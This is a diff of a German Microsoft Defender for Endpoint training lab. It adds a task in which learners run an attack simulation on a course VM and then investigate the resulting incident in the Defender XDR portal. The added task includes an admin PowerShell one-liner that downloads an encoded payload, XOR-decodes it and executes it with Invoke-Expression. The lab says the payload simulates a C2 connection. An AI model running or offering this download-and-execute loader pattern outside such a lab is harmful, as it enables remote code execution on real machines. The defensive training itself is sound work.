@@ -40,20 +40,6 @@ In dieser Aufgabe bestätigen Sie, dass das Gerät erfolgreich integriert ist un
 
     >**Hinweis:** Nach erfolgreicher Ausführung des Skripts wird das Fenster automatisch geschlossen, und nach ein paar Minuten werden Warnungen im Microsoft Defender XDR-Portal generiert.
 
-<!--- ### Task 2: Simulated Attacks
-
->**Note:** The Evaluation lab and the Tutorials & simulations section of the portal is no longer available. Please refer to the **[interactive lab simulation](https://mslabs.cloudguides.com/guides/SC-200%20Lab%20Simulation%20-%20Mitigate%20attacks%20with%20Microsoft%20Defender%20for%20Endpoint)** for a demonstration of the simulated attacks.
-
-1. From the left menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.
-
-1. Select the **Tutorials** tab.
-
-1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.
-
-1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button.
-
-    <!--- 1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*. This is no longer working due to win1 AV --->
-
 ### Aufgabe 2: Untersuchen von Warnungen und Vorfällen
 
 In dieser Aufgabe untersuchen Sie die Warnungen und Vorfälle, die vom Onboarding-Erkennungstestskript in der vorherigen Aufgabe generiert wurden.
@@ -84,6 +70,46 @@ In dieser Aufgabe untersuchen Sie die Warnungen und Vorfälle, die vom Onboardin
 
 1. Überprüfen Sie den Inhalt der Registerkarten *Angriffshistorie, Alarme, Ressourcen, Untersuchungen, Beweise und Reaktion* und *Zusammenfassung*. Geräte und Benutzer:innen befinden sich unter der Registerkarte *Ressourcen*. In einem echten Vorfall wird auf der Registerkarte *Angriffsverlauf* das *Vorfalldiagramm* angezeigt. **Hinweis:** Einige Registerkarten sind möglicherweise wegen der Größe Ihres Displays nicht sichtbar. Wählen Sie die Registerkarte Auslassungspunkte (…), um sie anzuzeigen.
 
-<!---    >**Warning:** The simulated attacks here are an excellent source of learning through practice. Only perform the attacks in the instructions provided for this lab when using the course provided Azure tenant.  You may perform other simulated attacks *after* this training course is complete with this tenant. --->
+### Aufgabe 3: Simulieren eines Angriffs
+
+>**Warnung:** Dieser simulierte Angriff ist eine hervorragende praktische Lernquelle. Führen Sie den Angriff aus den Anweisungen für diese Übung nur aus, wenn Sie den für den Kurs bereitgestellten Azure-Mandanten verwenden.  Sie können andere simulierte Angriffe für diesen Mandanten durchführen, *nachdem* dieser Schulungskurs abgeschlossen wurde.
+
+In dieser Aufgabe simulieren Sie einen Angriff auf die WIN1-VM und überprüfen, ob der Angriff von Microsoft Defender for Endpoint erkannt und abgewehrt wird.
+
+1. Klicken Sie auf der WIN1-VM *mit der rechten Maustaste* auf die Schaltfläche **Start**, und wählen Sie **Windows PowerShell (Administrator)** aus.
+
+1. Wenn das Fenster „Benutzerkontensteuerung“ angezeigt wird, wählen Sie **Ja**, um die App auszuführen.
+
+1. Kopieren Sie das folgende Simulationsskript, und fügen Sie es in das PowerShell-Fenster ein. Drücken Sie anschließend die **Eingabetaste**, um es auszuführen:
+
+    ```PowerShell
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    ;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');
+    $base64String = (Invoke-WebRequest -URI "https://wcdstaticfilesprdeus.blob.core.windows.net/wcdstaticfiles/MTP_Fileless_Recon.txt" -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0;
+    $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i];
+    $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+    ```
+
+    >**Hinweis:** Wenn beim Ausführen des Skripts Fehler (rot) auftreten, können Sie die Editor-App öffnen und das Skript in eine leere Datei kopieren. Stellen Sie sicher, dass *Zeilenumbruch* im Editor aktiviert ist. Kopieren Sie jede Zeile des Skripts, und führen Sie sie separat in PowerShell aus.
+
+1. Das Skript erzeugt eine Ausgabe mit mehreren Zeilen und die Meldung, dass *Domänencontroller in der Domäne nicht aufgelöst werden konnten*. Ein paar Sekunden später wird die *Editor*-App geöffnet. Ein simulierter Angriffscode wird im Editor eingefügt. Lassen Sie die automatisch generierte Editor-Instanz geöffnet, um das vollständige Szenario zu erleben. Der simulierte Angriffscode versucht, mit einer externen IP-Adresse zu kommunizieren (simuliert einen C2-Server).
+
+### Aufgabe 4: Untersuchen des simulierten Angriffs als einzelner Incident
+
+1. Wählen Sie im Microsoft Defender XDR-Portal in der linken Menüleiste **Incidents und Warnungen** und dann **Incidents** aus.
+
+1. Ein neuer Incident namens *Mehrstufiger Incident mit Verteidigungsumgehung und -ermittlung auf einem Endpunkt* befindet sich im rechten Bereich. Wählen Sie den Namen des Vorfalls, um seine Details zu laden.
+
+1. Reduzieren Sie auf der Registerkarte *Angriffsverlauf* die Bereiche **Warnungen** und **Incidentdetails**, um das vollständige **Incidentdiagramm** anzuzeigen.
+
+1. Zeigen Sie mit der Maus auf die **Incidentdiagrammknoten** und wählen Sie sie aus, um die *Entitäten* zu überprüfen.
+
+1. Erweitern Sie wieder den Bereich **Warnungen** (links) und wählen Sie **Angriffsverlauf wiedergeben** und das Symbol *Ausführen* aus. Dadurch wird die Angriffszeitleiste mit den einzelnen Warnungen angezeigt und das *Incidentdiagramm* dynamisch ausgefüllt.
+
+1. Überprüfen Sie den Inhalt der Registerkarten *Angriffshistorie, Alarme, Ressourcen, Untersuchungen, Beweise und Reaktion* und *Zusammenfassung*. Geräte und Benutzer:innen befinden sich unter der Registerkarte *Ressourcen*. **Hinweis:** Einige Registerkarten sind möglicherweise wegen der Größe Ihres Displays nicht sichtbar. Wählen Sie die Registerkarte Auslassungspunkte (…), um sie anzuzeigen.
+
+1. Wählen Sie auf der Registerkarte **Beweis und Antwort** die Option **IP-Adressen** und dann die angezeigte *IP-Adresse* aus. Überprüfen Sie im Popupfenster die IP-Adressdetails, scrollen Sie nach unten, und wählen Sie die Schaltfläche **IP-Adressseite öffnen** aus.
+
+1. Überprüfen Sie auf der Seite *IP-Adresse* die Registerkarten *„Übersicht“, „Incidents und Warnungen“ und „Beobachtet in Organisationen“*. Einige Registerkarten enthalten möglicherweise keine Informationen für die IP-Adresse.
 
 ## Damit haben Sie das Lab beendet
